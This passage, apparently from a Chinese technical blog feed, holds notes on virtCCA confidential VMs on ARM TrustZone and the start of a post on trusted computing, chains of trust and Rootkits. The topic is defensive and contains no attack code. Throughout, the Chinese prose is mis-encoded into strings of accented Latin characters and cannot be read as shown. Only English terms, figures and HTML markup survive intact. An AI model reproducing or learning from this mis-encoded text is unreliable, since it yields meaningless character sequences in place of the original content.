æ­¤å¯ä»¥è¿è¡Œç°æœ‰çš„å®Œæ•´Linuxå‘è¡Œç‰ˆå’Œåº”ç”¨ç¨‹åºã€‚ç”±äºå…¶æ¥å£ä¸CCAä¿æŒä¸€è‡´ï¼Œå› æ­¤virtCCAçš„æ•´ä¸ªè½¯ä»¶æ ˆä¹Ÿå¯ä»¥åŸæ ·åº”ç”¨äºæœªæ¥çœŸæ­£çš„CCAç¡¬ä»¶å¹³å°ã€‚</p><p>åœ¨å®‰å…¨è®¾è®¡ä¸Šï¼ŒvirtCCAå¤ç”¨äº†CCAçš„TCBæœ€å°åŒ–ç†å¿µï¼Œé‡‡ç”¨éš”ç¦»çš„å¯ä¿¡è½¯ä»¶TMMä»£æ›¿CCAä¸­çš„RMMï¼Œè´Ÿè´£å¯¹cVMçŠ¶æ€çš„æ§åˆ¶ã€éš”ç¦»ä¸è½¬æ¢ã€‚TMMè¿è¡Œåœ¨å®‰å…¨ä¸–ç•Œï¼ˆS-EL2æˆ–EL3ï¼‰ï¼Œè€ŒHypervisoråˆ™ä¿æŒåœ¨æ™®é€šä¸–ç•Œï¼ŒäºŒè€…ä¹‹é—´é€šè¿‡TMIï¼ˆTrusted Management Interfaceï¼‰é€šä¿¡ï¼Œæ¥å£è®¾è®¡ä¸CCAçš„RMIå…¼å®¹ã€‚</p><p>virtCCAé€šè¿‡ä¸ºæ¯ä¸ªcVMé¢„åˆ†é…ä¸€å—è¿ç»­ã€é™æ€çš„secure memoryåŒºåŸŸï¼Œé¿å…äº†å¤æ‚çš„åŠ¨æ€å†…å­˜å§”æ´¾ï¼ˆdelegateï¼‰æœºåˆ¶ã€‚è¿™ç§è®¾è®¡é™ä½äº†å†…å­˜ç®¡ç†å¤æ‚åº¦ï¼ŒåŒæ—¶ä¹Ÿé¿å…äº†é¢‘ç¹çš„å®‰å…¨æ€è½¬æ¢å¸¦æ¥çš„æ€§èƒ½æŸè€—ã€‚</p><p>å›¾1å±•ç¤ºäº†virtCCAä¸¤ç§éƒ¨ç½²æ–¹å¼ã€‚virtCCA-SEL2åœ¨æ”¯æŒS-EL2çš„ç³»ç»Ÿä¸Šè¿è¡Œï¼ŒcVMè¿è¡Œåœ¨S-EL1ï¼ŒTMMè¿è¡Œåœ¨S-EL2ï¼›virtCCA-EL3åœ¨æ—©æœŸå¹³å°ä¸Šè¿è¡Œï¼ŒcVMè¿è¡Œåœ¨secure EL1/EL0ï¼ŒTMMè¿è¡Œåœ¨EL3ï¼Œç”±ATFæ§åˆ¶ã€‚æ— è®ºå“ªç§éƒ¨ç½²æ–¹å¼ï¼ŒTMMå‡é€šè¿‡TMIæ¥å£ä¸KVMäº¤äº’ï¼Œå®ŒæˆcVMçš„ç”Ÿå‘½å‘¨æœŸç®¡ç†å’ŒçŠ¶æ€åˆ‡æ¢ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/af4ff3357d7612ccdef3704a7391a1d9-image.png" alt="af4ff3357d7612ccdef3704a7391a1d9-image"></p><h3 id="Memory-Isolationï¼ˆå†…å­˜éš”ç¦»ï¼‰">Memory Isolationï¼ˆå†…å­˜éš”ç¦»ï¼‰</h3><p>æœ¬èŠ‚æè¿°äº†virtCCAçš„ä¸¤çº§å†…å­˜éš”ç¦»æœºåˆ¶ï¼Œåˆ†åˆ«ç”¨äºæ™®é€šä¸–ç•Œä¸å®‰å…¨ä¸–ç•Œä¹‹é—´çš„éš”ç¦»ï¼Œä»¥åŠå¤šä¸ªcVMä¹‹é—´çš„éš”ç¦»ã€‚</p><p>é¦–å…ˆï¼ŒvirtCCAåˆ©ç”¨TZASCä¿ƒè¿›å®‰å…¨ä¸–ç•Œå’Œæ­£å¸¸ä¸–ç•Œä¹‹é—´çš„å†…å­˜åˆ†ç¦»ã€‚</p><p>å…¶æ¬¡ï¼ŒvirtCCAåœ¨å¤šä¸ªç›¸äº’ä¸ä¿¡ä»»çš„cVMä¹‹é—´å¼ºåˆ¶æ‰§è¡Œå†…å­˜éš”ç¦»ã€‚åœ¨virtCCA-SEL2ä¸­ï¼ŒTMMç®¡ç†æ‰€æœ‰cVMçš„ç¬¬2é˜¶æ®µé¡µè¡¨ï¼Œç¡®ä¿cVMä½¿ç”¨çš„å®‰å…¨å†…å­˜ä¸é‡å ã€‚åœ¨virtCCA-EL3ä¸­ï¼Œç³»ç»Ÿé€šè¿‡å°†cVMçš„é¡µè¡¨æŒ‡å®šä¸ºåªè¯»æ¥é˜²æ­¢cVMè®¿é—®å¦ä¸€ä¸ªcVMçš„å†…å­˜ã€‚å› æ­¤ï¼ŒcVMå¯¹é¡µè¡¨æ‰€åšçš„ä»»ä½•ä¿®æ”¹éƒ½å°†ç”±TMMåœ¨EL3å¤„æ‹¦æˆªå’Œå®¡æ ¸ã€‚</p><h3 id="Interrupt-and-Device-Virtualizationï¼ˆä¸­æ–­å’Œè®¾å¤‡è™šæ‹ŸåŒ–ï¼‰">Interrupt and Device Virtualizationï¼ˆä¸­æ–­å’Œè®¾å¤‡è™šæ‹ŸåŒ–ï¼‰</h3><p>æœ¬èŠ‚è®¨è®ºvirtCCAåœ¨ä¸­æ–­å’Œè®¾å¤‡è™šæ‹ŸåŒ–æ–¹é¢çš„å¤„ç†æœºåˆ¶ã€‚åœ¨CCAæ¶æ„ä¸­ï¼Œhostæä¾›virtual GICï¼ˆvGICï¼‰ç»™cVMä½¿ç”¨ï¼Œå¹¶èƒ½é€šè¿‡GIC vCPUæ¥å£æ³¨å…¥è™šæ‹Ÿä¸­æ–­ã€‚</p><p><strong>virtCCA-SEL2ä¸Šçš„ä¸­æ–­ç¿»è¯‘</strong>ã€‚hostä»¿çœŸvGICï¼ŒTMMè´Ÿè´£å®‰å…¨/éå®‰å…¨ä¸–ç•Œé—´ä¸­æ–­ç±»å‹è½¬æ¢ã€‚ç”±äºLinuxå†…æ ¸ä¸­GICé©±åŠ¨é»˜è®¤å°†ä¸­æ–­é…ç½®ä¸ºGroup 1ï¼ˆéå®‰å…¨ï¼‰ï¼Œåœ¨cVMä¸­ä¼šè¢«è§†ä¸ºFIQï¼Œä½†LinuxåªæœŸæœ›æ¥æ”¶IRQã€‚ä¸ºé¿å…ä¿®æ”¹Linuxå†…æ ¸ï¼ŒTMMå°†FIQæ‹¦æˆªå¹¶æ ‡è®°ä¸ºIRQï¼Œå†é€šçŸ¥KVMå¤„ç†è¯¥ä¸­æ–­å¹¶å°†å…¶é‡æ–°æ³¨å…¥ä¸ºvIRQï¼Œæœ€åé€šè¿‡ERETå›åˆ°cVMç»§ç»­æ‰§è¡Œã€‚æ•´ä¸ªè¿‡ç¨‹æ¨¡æ‹Ÿäº†å®‰å…¨ä¸–ç•Œä¸æ™®é€šä¸–ç•Œä¸­æ–­åˆ‡æ¢ï¼Œå¹¶åœ¨TMMä¸­å®ç°FIQåˆ°IRQçš„è¯­ä¹‰è½¬æ¢ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/a635b3b8a86f9317695ee3f1f0cee3f8-image.png" alt="a635b3b8a86f9317695ee3f1f0cee3f8-image"></p><p><strong>virtCCA-EL3ä¸Šçš„ä¸­æ–­è™šæ‹ŸåŒ–</strong>ï¼Œç”±äºsecure worldä¸æ”¯æŒä¸­æ–­è™šæ‹ŸåŒ–ï¼ˆå³ç¼ºä¹GIC list registersï¼‰ï¼ŒTMMå¿…é¡»å®Œå…¨ä»¥è½¯ä»¶æ–¹å¼æ¨¡æ‹Ÿä¸­æ–­æ³¨å…¥ã€‚TMMè®°å½•æ¯ä¸ªvCPUçš„ä¸­æ–­ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼ˆå¦‚PCã€PSTATEï¼‰ï¼Œæ ¹æ®ä¸­æ–­ç±»å‹æ„é€ æ–°çš„å¤„ç†ä¸Šä¸‹æ–‡ï¼Œå¹¶æ¨¡æ‹Ÿlist registersè¡Œä¸ºï¼Œå°†æ–°PCå†™å…¥ELR_EL1ï¼Œå®ç°è™šæ‹Ÿä¸­æ–­æ³¨å…¥ã€‚ERETæŒ‡ä»¤ä¹‹åæ¢å¤åŸçŠ¶æ€ã€‚å¯¹GICå¯„å­˜å™¨çš„è®¿é—®åˆ™è¢«æ›¿æ¢ä¸ºSMCè°ƒç”¨ï¼Œç”±TMMæ¨¡æ‹Ÿå“åº”ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/6611a1855e7aa8be434a84c62d5f4b72-image.png" alt="6611a1855e7aa8be434a84c62d5f4b72-image"></p><p><strong>MMIOè®¿é—®</strong>ã€‚åœ¨virtCCA-SEL2ä¸­ï¼Œç”±ç¡¬ä»¶ç”Ÿæˆtranslation faultï¼Œç”±TMMæ•è·å¹¶å°†è®¿é—®äº¤ç”±KVMå¤„ç†ã€‚åœ¨virtCCA-EL3ä¸­ï¼Œæ— æ³•ä¾èµ–ç¡¬ä»¶æ•…éšœæœºåˆ¶ï¼Œå› æ­¤åœ¨Guestå†…æ ¸ä¸­å°†MMIOè®¿é—®æ›¿æ¢ä¸ºSMCï¼Œç”±TMMæ¨¡æ‹ŸESRå†…å®¹å¹¶é€šçŸ¥KVMã€‚TMMè¿˜è´Ÿè´£ä»¿çœŸPSCIä¸è™šæ‹Ÿè®¡æ—¶å™¨ç­‰åŠŸèƒ½ã€‚</p><h3 id="Measurement-and-Attestationï¼ˆæµ‹é‡å’Œè®¤è¯ï¼‰">Measurement and Attestationï¼ˆæµ‹é‡å’Œè®¤è¯ï¼‰</h3><p>æœ¬èŠ‚é˜è¿°virtCCAå¦‚ä½•å®ç°è¿œç¨‹è¯æ˜ï¼ˆattestationï¼‰æœºåˆ¶ï¼Œä¸CCAä¿æŒä¸€è‡´ã€‚</p><p>å¹³å°éœ€è¦æä¾›å¯é çš„Root of Trustï¼ˆRoTï¼‰ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>å®‰å…¨å­˜å‚¨çš„å¹³å°ç§é’¥ï¼ˆInitial Attestation Key, IAKï¼‰ï¼›</li><li>ä¸å¯ç¯¡æ”¹çš„å¼•å¯¼ä»£ç ï¼ˆå¦‚ROMä¸­çš„Bootloaderï¼‰ï¼›</li><li>ç¡¬ä»¶/å›ºä»¶ç”Ÿæˆçš„éšæœºæºï¼›</li><li>IAKè¯ä¹¦åœ¨åˆ¶é€ é˜¶æ®µç”±CAä¸‹å‘ã€‚</li></ul><p>å¹³å°å¯åŠ¨è¿‡ç¨‹ä¸­ï¼ŒBootloaderåº¦é‡ATFå¹¶è®°å½•å¹³å°é…ç½®ï¼ˆç”Ÿå‘½å‘¨æœŸçŠ¶æ€ã€ç¡¬ä»¶è®¾ç½®ï¼‰ï¼Œç„¶åATFåº¦é‡TMMå¹¶ç”ŸæˆcVM attestation keyï¼ˆCAKï¼‰ï¼Œè®°å½•æ•´ä¸ªå¯åŠ¨æµç¨‹ã€‚æœ€ç»ˆç”±IAKå¯¹å¹³å°æµ‹é‡ç»“æœä¸CAKè¿›è¡Œç­¾åï¼Œå½¢æˆå¹³å°ä»¤ç‰Œï¼ˆplatform tokenï¼‰ã€‚</p><p>cVMåœ¨åˆ›å»ºæ—¶ç”±TMMåº¦é‡å…¶åˆå§‹ä»£ç ä¸æ•°æ®æ®µï¼Œç”ŸæˆcVMåˆå§‹åº¦é‡ï¼ˆCIMï¼‰ï¼ŒéšååŠ è½½é¡µä¸æ‰§è¡Œç¯å¢ƒæ—¶ç»§ç»­æ‰©å±•CIMã€‚åº¦é‡ä¿¡æ¯é€šè¿‡TSI_MEASURE_EXTENDæ¥å£æä¾›ç»™OSï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºå¯å°†è‡ªèº«ä¿¡æ¯æ‰©å±•è‡³CIMä¸­ã€‚æœ€ç»ˆcVMç”Ÿæˆçš„åº¦é‡ç»“æœç”±CAKç­¾åå½¢æˆcVM tokenï¼Œå¹³å°tokenä¸­å«æœ‰CAKå…¬é’¥çš„hashï¼Œå®ç°äºŒè€…ç»‘å®šã€‚</p><p>åœ¨è¿œç¨‹è¯æ˜æµç¨‹ä¸­ï¼ŒVerifierå‘cVMå‘é€Challengeï¼ŒcVMå°†å…¶åŒ…å«åœ¨ç­¾åæŠ¥å‘Šä¸­è¿”å›ï¼Œé€šè¿‡éªŒè¯ç­¾åä¸åº¦é‡å€¼ç¡®ä¿cVMçš„å®Œæ•´æ€§ï¼Œå¹¶å»ºç«‹åŠ å¯†é€šé“ç”¨äºåç»­æ•°æ®ä¼ è¾“ã€‚</p><h2 id="Security-Analysisï¼ˆå®‰å…¨æ€§åˆ†æï¼‰">Security Analysisï¼ˆå®‰å…¨æ€§åˆ†æï¼‰</h2><p>virtCCA çš„å¯ä¿¡è®¡ç®—åŸºä»…åŒ…å« TrustZone ç¡¬ä»¶ã€ATF å’Œ TMMã€‚TMM ä»£ç é‡çº¦ 3.2Kï¼ˆEL3ï¼‰æˆ– 4Kï¼ˆSEL2ï¼‰ï¼Œè¶³å¤Ÿç²¾ç®€ä»¥è¿›è¡Œå½¢å¼åŒ–éªŒè¯ã€‚cVM å†…å­˜åœ¨é”€æ¯æ—¶ä¼šè¢«æ“¦é™¤ï¼ŒDMA æ”»å‡»è¢« TZASC é˜»æ–­ã€‚virtCCA è¿˜é€šè¿‡ä¸Šä¸‹æ–‡æ¸…ç†ç¡®ä¿ä¸­æ–­/å¼‚å¸¸æ—¶ hypervisor è·å–ä¸åˆ° cVM å†…éƒ¨çŠ¶æ€ï¼Œå®‰å…¨æ¨¡å‹åŸºæœ¬ç­‰åŒäº ARM CCAã€‚</p><h2 id="Evaluationï¼ˆè¯„ä¼°ï¼‰">Evaluationï¼ˆè¯„ä¼°ï¼‰</h2><h3 id="Experimental-Setupï¼ˆå®éªŒè®¾ç½®ï¼‰">Experimental Setupï¼ˆå®éªŒè®¾ç½®ï¼‰</h3><p>ä½¿ç”¨çœŸå®ARMæœåŠ¡å™¨è¯„ä¼°ï¼š</p><ul><li>virtCCA-SEL2ï¼šARM V8.4æœåŠ¡å™¨ï¼Œ64GB RAM</li><li>virtCCA-EL3ï¼šKunpeng 920 CPUï¼Œ256GB RAM</li></ul><h3 id="Sanity-Check-of-TMM-Interfacesï¼ˆTMMæ¥å£å¥å…¨æ€§æ£€æŸ¥ï¼‰">Sanity Check of TMM Interfacesï¼ˆTMMæ¥å£å¥å…¨æ€§æ£€æŸ¥ï¼‰</h3><p>å®ç°äº†TESTæ¡†æ¶éªŒè¯18ä¸ªTMIæ¥å£ï¼Œè¦†ç›–å¤šæ ¸å¤„ç†ã€ç«äº‰æ¡ä»¶ç­‰åœºæ™¯</p><h3 id="Micro-benchmarksï¼ˆå¾®åŸºå‡†æµ‹è¯•ï¼‰">Micro-benchmarksï¼ˆå¾®åŸºå‡†æµ‹è¯•ï¼‰</h3><p>æµ‹é‡å¸¸è§hypervisoræ“ä½œå¼€é”€ï¼š</p><ul><li>IPIï¼švirtCCA-SEL2(43.83Î¼s) vs åŸç”Ÿ(4.0Î¼s)</li><li>I/Oï¼švirtCCA-SEL2(272.38Î¼s) vs åŸç”Ÿ(42.33Î¼s)</li></ul><h3 id="Macro-benchmarksï¼ˆå®åŸºå‡†æµ‹è¯•ï¼‰">Macro-benchmarksï¼ˆå®åŸºå‡†æµ‹è¯•ï¼‰</h3><p>Redisã€MySQL ç­‰è´Ÿè½½æ€§èƒ½ä¸‹é™æœ‰é™ï¼ˆ&lt;10%ï¼‰ï¼ŒApacheï¼ˆI/O å¯†é›†ï¼‰æœ€å¤§çº¦ 29.5%ï¼›EL3 æ¨¡å¼ä¸‹ Hackbench ç­‰åŸºå‡†ç”šè‡³æ€§èƒ½æå‡ï¼Œå½’å› äºå…é™¤è™šæ‹ŸåŒ–å¼€é”€ã€‚</p><h1 id="HyperEnclave-An-Open-and-Cross-platform-Trusted-Execution-Environment">HyperEnclave: An Open and Cross-platform Trusted Execution Environment</h1><p>è¿™æ˜¯ä¸€ç¯‡å…³äºæ„é€ ç¡¬ä»¶é€šç”¨çš„è¿›ç¨‹çº§å¯ä¿¡æ‰§è¡Œç¯å¢ƒTEEçš„æ–‡ç« ï¼Œåˆšå¥½è·Ÿæˆ‘ä»¬é¡¹ç›®ä¸­çš„ä¸€ä¸ªç‚¹å¯¹åº”ä¸Šï¼Œä¹Ÿæ˜¯æˆ‘ä¹‹å‰è§‰å¾—ç‰¹åˆ«éš¾çš„ä¸€ä¸ªç‚¹ï¼Œç”±æ­¤åšä¸ªè®°å½•ã€‚</p><h2 id="Abstract-4">Abstract</h2>]]></content>
    
    
    
    <tags>
      
      <tag>å¯ä¿¡è®¡ç®—</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯ä¿¡è®¡ç®—å­¦ä¹ </title>
    <link href="/2024/11/19/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/11/19/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="æ€»ç»“çš„å¯ä¿¡è®¡ç®—">æ€»ç»“çš„å¯ä¿¡è®¡ç®—</h1><h1 id="å¯ä¿¡è®¡ç®—æ¦‚å¿µ">å¯ä¿¡è®¡ç®—æ¦‚å¿µ</h1><p>ä»¥PCæœºå¯ä¿¡ä¸¾ä¾‹ï¼Œé€šä¿—æ¥è®²ï¼Œå¯ä¿¡å°±æ˜¯åœ¨æ¯å°PCæœºå¯åŠ¨æ—¶æ£€æµ‹BIOSå’Œæ“ä½œç³»ç»Ÿçš„å®Œæ•´æ€§å’Œæ­£ç¡®æ€§ï¼Œä¿éšœä½ åœ¨ä½¿ç”¨PCæ—¶ç¡¬ä»¶é…ç½®å’Œæ“ä½œç³»ç»Ÿæ²¡æœ‰è¢«ç¯¡æ”¹è¿‡ï¼Œæ‰€æœ‰ç³»ç»Ÿçš„å®‰å…¨æªæ–½å’Œè®¾ç½®éƒ½ä¸ä¼šè¢«ç»•è¿‡ï¼›åœ¨å¯åŠ¨åï¼Œå¯¹æ‰€æœ‰çš„åº”ç”¨ï¼Œå¦‚ç¤¾äº¤è½¯ä»¶ã€éŸ³ä¹è½¯ä»¶ã€è§†é¢‘è½¯ä»¶ç­‰åº”ç”¨å¯è¿›è¡Œå®æ—¶ç›‘æ§ï¼Œè‹¥å‘ç°åº”ç”¨è¢«ç¯¡æ”¹ç«‹å³é‡‡å–æ­¢æŸæªæ–½ã€‚</p><p>ä»¥æ€æ¯’è½¯ä»¶ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ä¸ºä»£è¡¨çš„ä¼ ç»Ÿâ€œè€ä¸‰æ ·â€é˜²å¾¡ç³»ç»Ÿï¼Œéœ€è¦é¢„å…ˆæ•æ‰é»‘å®¢æ”»å‡»å’Œç—…æ¯’å…¥ä¾µçš„ç‰¹å¾ä¿¡æ¯ï¼Œå±äºâ€œäº‹åé˜²å¾¡â€çš„â€œé»‘åå•â€æœºåˆ¶ï¼Œéš¾ä»¥åº”å¯¹è¿™ç§æœªçŸ¥çš„æ¶æ„æ”»å‡»ã€‚è€Œå¯ä¿¡è®¡ç®—ä½œä¸ºä¸€ç§â€œç™½åå•â€æœºåˆ¶ï¼Œç±»ä¼¼äººä½“çš„ä¸»åŠ¨å…ç–«ç³»ç»Ÿï¼Œé€šè¿‡åŒºåˆ†â€œè‡ªå·±â€å’Œâ€œéå·±â€æˆåˆ†ï¼Œå¯åŠæ—¶æ¸…é™¤å„ç±»æœªçŸ¥é£é™©ã€‚</p><p>æ­¤å¤–ï¼Œä¼ ç»Ÿçš„å®‰å…¨é˜²æŠ¤æœºåˆ¶å¾€å¾€è¿è¡Œåœ¨åº”ç”¨å±‚æˆ–æ“ä½œç³»ç»Ÿå±‚ï¼Œæ˜¯â€œè‡ªä¸Šè€Œä¸‹â€çš„ä¿æŠ¤ï¼Œä¸€æ—¦å¯åŠ¨è¿‡ç¨‹ä¸­ç³»ç»Ÿè¢«æ¤å…¥äº†Rootkit/BootKitæˆ–æ¶æ„å›ºä»¶ï¼Œè¿™äº›ä½äºå¯åŠ¨é“¾æœ«ç«¯çš„å®‰å…¨é˜²æŠ¤æœºåˆ¶å¯èƒ½å®Œå…¨æ— æ³•ç”Ÿæ•ˆã€‚</p><h2 id="ä»€ä¹ˆæ˜¯Rootkit">ä»€ä¹ˆæ˜¯Rootkit</h2><p>1985å¹´ï¼Œç¾å›½å›½é˜²éƒ¨å‘å¸ƒäº†ä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªå¯ä¿¡è®¡ç®—æ ‡å‡†â€”â€”ã€Šå¯ä¿¡è®¡ç®—æœºç³»ç»Ÿè¯„ä»·æ ‡å‡†ã€‹ï¼ˆTCSECï¼Œå³è‘—åçš„â€œæ©˜çš®ä¹¦â€ï¼‰ï¼Œç¬¬ä¸€æ¬¡æå‡ºäº†å¯ä¿¡è®¡ç®—åŸºï¼ˆTrusted Computing Base, TCBï¼‰çš„æ¦‚å¿µï¼Œå¹¶æŠŠTCBä½œä¸ºä¿¡æ¯ç³»ç»Ÿå®‰å…¨çš„åŸºç¡€ã€‚</p><p>æˆªæ­¢åˆ°ç›®å‰ï¼Œå›½é™…ä¸Šå·²å½¢æˆä»¥TPMèŠ¯ç‰‡ä¸ºä¿¡ä»»æ ¹çš„TCGæ ‡å‡†ç³»åˆ—ï¼Œå›½å†…å·²å½¢æˆä»¥TCMèŠ¯ç‰‡ä¸ºä¿¡ä»»æ ¹çš„åŒä½“ç³»æ¶æ„å¯ä¿¡æ ‡å‡†ç³»åˆ—ã€‚</p><p>å›½é™…ä¸å›½å†…ä¸¤å¥—æ ‡å‡†æœ€ä¸»è¦çš„å·®å¼‚ä¸ºï¼š</p><ul><li><p>ä¿¡ä»»èŠ¯ç‰‡æ˜¯å¦æ”¯æŒå›½äº§å¯†ç ç®—æ³•ï¼Œå›½å®¶å¯†ç å±€ä¸»å¯¼æå‡ºäº†ä¸­å›½å•†ç”¨å¯†ç å¯ä¿¡è®¡ç®—åº”ç”¨æ ‡å‡†ï¼Œå¹¶ç¦æ­¢åŠ è½½å›½é™…ç®—æ³•çš„å¯ä¿¡è®¡ç®—äº§å“åœ¨å›½å†…é”€å”®ï¼›</p></li><li><p>ä¿¡ä»»èŠ¯ç‰‡æ˜¯å¦æ”¯æŒæ¿å¡å±‚é¢çš„ä¼˜å…ˆåŠ ç”µæ§åˆ¶ï¼Œå›½å†…éƒ¨åˆ†å­¦è€…è®¤ä¸ºå›½é™…æ ‡å‡†æå‡ºçš„CPUå…ˆåŠ ç”µã€åä¾é å¯†ç èŠ¯ç‰‡å»ºç«‹ä¿¡ä»»é“¾çš„æ¨¡å¼å¼ºåº¦ä¸å¤Ÿï¼Œä¸ºæ­¤ï¼Œæå‡ºåŸºäºTPCMèŠ¯ç‰‡çš„åŒä½“ç³»è®¡ç®—å®‰å…¨æ¶æ„ï¼ŒTPCMèŠ¯ç‰‡é™¤äº†å¯†ç åŠŸèƒ½å¤–ï¼Œå¿…é¡»å…ˆäºCPUåŠ ç”µï¼Œå…ˆäºCPUå¯¹BIOSè¿›è¡Œå®Œæ•´æ€§åº¦é‡ï¼›</p></li><li><p>å¯ä¿¡è½¯ä»¶æ ˆæ˜¯å¦æ”¯æŒæ“ä½œç³»ç»Ÿå±‚é¢çš„é€æ˜å¯ä¿¡æ§åˆ¶ï¼Œå›½å†…éƒ¨åˆ†å­¦è€…è®¤ä¸ºå›½é™…æ ‡å‡†éœ€è¦ç¨‹åºè¢«åŠ¨è°ƒç”¨å¯ä¿¡æ¥å£ï¼Œä¸èƒ½åœ¨æ“ä½œç³»ç»Ÿå±‚é¢è¿›è¡Œä¸»åŠ¨åº¦é‡ï¼Œä¸ºæ­¤ï¼Œæå‡ºåœ¨æ“ä½œç³»ç»Ÿå†…æ ¸å±‚é¢å¯¹åº”ç”¨ç¨‹åºå®Œæ•´æ€§å’Œç¨‹åºè¡Œä¸ºè¿›è¡Œé€æ˜å¯ä¿¡åˆ¤å®šåŠæ§åˆ¶æ€è·¯ã€‚</p></li></ul><h1 id="å¯ä¿¡è®¡ç®—çš„åŸºæœ¬æ€æƒ³">å¯ä¿¡è®¡ç®—çš„åŸºæœ¬æ€æƒ³</h1><p>ä¿¡ä»»çš„è·å¾—æ–¹æ³•ä¸»è¦æœ‰ç›´æ¥å’Œé—´æ¥ä¸¤ç§ã€‚è®¾Aå’ŒBä»¥å‰æœ‰è¿‡äº¤å¾€ï¼Œåˆ™Aå¯¹Bçš„å¯ä¿¡åº¦å¯ä»¥é€šå¸¸è€ƒå¯ŸBä»¥å¾€çš„è¡¨ç°æ¥ç¡®å®šï¼Œæˆ‘ä»¬ç§°è¿™ç§é€šè¿‡ç›´æ¥äº¤å¾€å¾—åˆ°çš„ä¿¡ä»»å€¼ä¸ºç›´æ¥ä¿¡ä»»å€¼ã€‚è®¾Aå’ŒBä»¥å‰æ²¡æœ‰ä»»ä½•äº¤å¾€ï¼Œä½†Aä¿¡ä»»Cï¼Œå¹¶ä¸”Cä¿¡ä»»Bï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬ç§°Aå¯¹Bçš„ä¿¡ä»»ä¸ºé—´æ¥ä¿¡ä»»ã€‚æœ‰æ—¶è¿˜å¯èƒ½å‡ºç°å¤šçº§é—´æ¥ä¿¡ä»»çš„æƒ…å†µï¼Œè¿™æ—¶ä¾¿äº§ç”Ÿäº†ä¿¡ä»»é“¾ã€‚</p><p>åœ¨è®¡ç®—å¹³å°ä¸­ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªå®‰å…¨ä¿¡ä»»æ ¹ï¼Œå†å»ºç«‹ä»ç¡¬ä»¶å¹³å°ã€æ“ä½œç³»ç»Ÿåˆ°åº”ç”¨ç³»ç»Ÿçš„ä¿¡ä»»é“¾ï¼Œåœ¨è¿™æ¡ä¿¡ä»»é“¾ä¸Šä»æ ¹å¼€å§‹ä¸€çº§åº¦é‡éªŒè¯ä¸€çº§ï¼Œä¸€çº§ä¿¡ä»»ä¸€çº§ï¼Œä»¥æ­¤å®ç°ä¿¡ä»»çš„é€çº§æ‰©å±•ï¼Œä»è€Œæ„å»ºä¸€ä¸ªå®‰å…¨å¯ä¿¡çš„è®¡ç®—ç¯å¢ƒã€‚ä¸€ä¸ªå¯ä¿¡è®¡ç®—ç³»ç»Ÿç”±ä¿¡ä»»æ ¹ã€å¯ä¿¡ç¡¬ä»¶å¹³å°ã€å¯ä¿¡æ“ä½œç³»ç»Ÿå’Œå¯ä¿¡åº”ç”¨ç»„æˆï¼Œå…¶ç›®æ ‡æ˜¯æé«˜è®¡ç®—å¹³å°çš„å®‰å…¨æ€§ã€‚</p><h2 id="TCGçš„ä¿¡ä»»é“¾">TCGçš„ä¿¡ä»»é“¾</h2><p><strong>CRTM â†’ BIOS/UEFI â†’ OS Loader â†’ OS â†’ Applications</strong>ï¼Œæ¯ä¸ªé˜¶æ®µé€æ­¥å»ºç«‹èµ·ä¸€ä¸ªå¯ä¿¡çš„é“¾æ¡ã€‚è¿™è¢«ç§°ä¸º<strong>é™æ€ä¿¡ä»»é“¾ï¼ˆStatic Chain of Trustï¼‰</strong>ï¼Œæ˜¯å¯ä¿¡è®¡ç®—ä¸­çš„ä¸€ä¸ªå…¸å‹å®ç°ã€‚</p><p>å…·ä½“æ¥è¯´ï¼š</p><p><strong>CRTMï¼ˆCore Root of Trust for Measurementï¼‰</strong></p><ul><li><strong>ä½œç”¨</strong>ï¼šä¿¡ä»»é“¾çš„èµ·ç‚¹ï¼Œæ˜¯ç¬¬ä¸€ä¸ªè¢«æ‰§è¡Œå¹¶æµ‹é‡çš„å¯ä¿¡ä»£ç ã€‚</li><li><strong>ç‰¹ç‚¹</strong>ï¼šé€šå¸¸åµŒå…¥ç¡¬ä»¶æˆ–å›ºä»¶ä¸­ï¼Œè´Ÿè´£æµ‹é‡ç³»ç»Ÿå¯åŠ¨æ—¶çš„å…³é”®æ•°æ®ï¼ˆä¾‹å¦‚BIOSçš„å“ˆå¸Œå€¼ï¼‰ã€‚</li><li><strong>å®ç°æ–¹å¼</strong>ï¼šè¿™éƒ¨åˆ†ä»£ç é€šå¸¸æ˜¯ä¸å¯æ›´æ”¹çš„ï¼Œæ¯”å¦‚å­˜å‚¨åœ¨åªè¯»å­˜å‚¨å™¨ï¼ˆROMï¼‰æˆ–å›ºä»¶ä¸­ã€‚</li><li><strong>è¾“å‡º</strong>ï¼šå°†æµ‹é‡ç»“æœå­˜å‚¨åœ¨TPMçš„PCRï¼ˆPlatform Configuration Registerï¼‰ä¸­ã€‚</li></ul><p><strong>BIOS/UEFIï¼ˆBasic Input/Output System/Unified Extensible Firmware Interfaceï¼‰</strong></p><ul><li><strong>ä½œç”¨</strong>ï¼šåˆå§‹åŒ–ç¡¬ä»¶ï¼ŒåŠ è½½å¹¶æµ‹é‡ä¸‹ä¸€é˜¶æ®µçš„å¯åŠ¨ç¨‹åºï¼ˆOS Loaderï¼‰ã€‚</li><li><strong>ç‰¹ç‚¹</strong>ï¼šBIOS/UEFIåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ä¼šå¯¹å…¶è‡ªèº«å’Œå¼•å¯¼åŠ è½½å™¨è¿›è¡Œæµ‹é‡ã€‚</li><li><strong>è¾“å‡º</strong>ï¼šå°†è¿™äº›æµ‹é‡ç»“æœè®°å½•åœ¨TPMä¸­ã€‚</li></ul><p><strong>OS Loaderï¼ˆæ“ä½œç³»ç»ŸåŠ è½½å™¨ï¼‰</strong></p><ul><li><strong>ä½œç”¨</strong>ï¼šåŠ è½½æ“ä½œç³»ç»Ÿå†…æ 